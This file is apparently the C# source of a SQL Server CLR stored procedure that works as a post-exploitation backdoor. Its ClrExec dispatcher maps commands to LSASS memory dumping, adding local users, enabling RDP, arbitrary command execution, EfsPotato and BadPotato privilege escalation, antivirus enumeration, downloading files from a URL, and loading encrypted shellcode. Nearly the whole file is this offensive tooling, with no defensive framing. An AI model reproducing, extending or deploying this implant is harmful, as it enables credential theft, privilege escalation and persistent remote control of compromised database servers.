using System;
using System.Text.RegularExpressions;
using CLR_module;
using Microsoft.SqlServer.Server;

public class StoredProcedures
{
	[SqlProcedure]
	public static void ClrExec(string cmd)
	{
		if (cmd.Contains("clr_dumplsass"))
		{
			string[] array = cmd.Split(' ');
			string environmentVariable = Environment.GetEnvironmentVariable("SystemRoot");
			string dumpDir = $"{environmentVariable}\\Temp\\";
			if (array.Length == 1)
			{
				dumplsass.run(dumpDir);
			}
			else
			{
				dumplsass.run(array[1]);
			}
		}
		else if (cmd.Contains("clr_pwd"))
		{
			basefun.GetCurrentDir();
		}
		else if (cmd.Contains("clr_ls"))
		{
			string[] array2 = cmd.Split(' ');
			if (array2.Length == 1)
			{
				basefun.ListDir("");
			}
			else
			{
				basefun.ListDir(array2[1]);
			}
		}
		else if (cmd.Contains("clr_cd"))
		{
			string[] array3 = cmd.Split(' ');
			basefun.SetCurrentDir(array3[1]);
		}
		else if (cmd.Contains("clr_ping"))
		{
			string[] array4 = cmd.Split(' ');
			basefun.ping(array4[1]);
		}
		else if (cmd.Contains("clr_rm"))
		{
			string[] array5 = cmd.Split(' ');
			basefun.DeleteFile(array5[1]);
		}
		else if (cmd.Contains("clr_cat"))
		{
			string[] array6 = cmd.Split(' ');
			basefun.GetContent(array6[1]);
		}
		else if (cmd.Contains("clr_ps"))
		{
			basefun.ListProcess();
		}
		else if (cmd.Contains("clr_netstat"))
		{
			basefun.netstat();
		}
		else if (cmd.Contains("clr_getav"))
		{
			getav.run();
		}
		else if (cmd.Contains("clr_rdp"))
		{
			RDP.run();
		}
		else if (cmd.Contains("clr_adduser"))
		{
			string[] array7 = cmd.Split(' ');
			string userName = array7[1];
			string password = array7[2];
			adduser.add(userName, password);
		}
		else if (cmd.Contains("clr_cmd"))
		{
			string cmd2 = cmd.Replace("clr_cmd ", "");
			exec.run(cmd2);
		}
		else if (cmd.Contains("clr_exec"))
		{
			string text = cmd.Replace("clr_exec ", "");
			if (text.Contains("-p"))
			{
				if (text.Contains("-a"))
				{
					text = text.Replace("-p ", "");
					string[] array8 = Regex.Split(text, "-a");
					string proc = array8[0];
					string arg = array8[1];
					exec.run1(proc, arg);
				}
				else
				{
					text = text.Replace("-p ", "");
					exec.run1(text, "");
				}
			}
			else
			{
				exec.run(text);
			}
		}
		else if (cmd.Contains("clr_efspotato"))
		{
			string text2 = cmd.Replace("clr_efspotato ", "");
			if (text2.Contains("-p"))
			{
				if (text2.Contains("-a"))
				{
					text2 = text2.Replace("-p ", "");
					string[] array9 = Regex.Split(text2, "-a");
					string program = array9[0];
					string programArgs = array9[1];
					Potato.EfsPotatoProg(program, programArgs);
				}
				else
				{
					text2 = text2.Replace("-p ", "");
					Potato.EfsPotatoProg(text2, "");
				}
			}
			else
			{
				Potato.EfsPotatoExec(text2);
			}
		}
		else if (cmd.Contains("clr_badpotato"))
		{
			string text3 = cmd.Replace("clr_badpotato ", "");
			if (text3.Contains("-p"))
			{
				if (text3.Contains("-a"))
				{
					text3 = text3.Replace("-p ", "");
					string[] array10 = Regex.Split(text3, "-a");
					string prog = array10[0];
					string arg2 = array10[1];
					BadPotato.BadPotatoPorc(prog, arg2);
				}
				else
				{
					text3 = text3.Replace("-p ", "");
					BadPotato.BadPotatoPorc(text3, "");
				}
			}
			else
			{
				BadPotato.BadPotatoCMD(text3);
			}
		}
		else if (cmd.Contains("clr_download"))
		{
			string[] array11 = cmd.Split(' ');
			string url = array11[1];
			string localpath = array11[2];
			download.run(url, localpath);
		}
		else if (cmd.Contains("clr_combine"))
		{
			string[] array12 = cmd.Split(' ');
			string remoteFile = array12[1];
			basefun.run(remoteFile);
		}
		else if (cmd.Contains("clr_scloader"))
		{
			string[] array13 = cmd.Split(' ');
			if (array13[0] == "clr_scloader")
			{
				string code = array13[1];
				string key = array13[2];
				shellcodeloader.run(code, key);
			}
			else if (array13[0] == "clr_scloader1")
			{
				string file = array13[1];
				string key2 = array13[2];
				shellcodeloader.run1(file, key2);
			}
			else if (array13[0] == "clr_scloader2")
			{
				string file2 = array13[1];
				shellcodeloader.run2(file2);
			}
		}
		else
		{
			SqlContext.Pipe.Send("Command error");
		}
	}
}
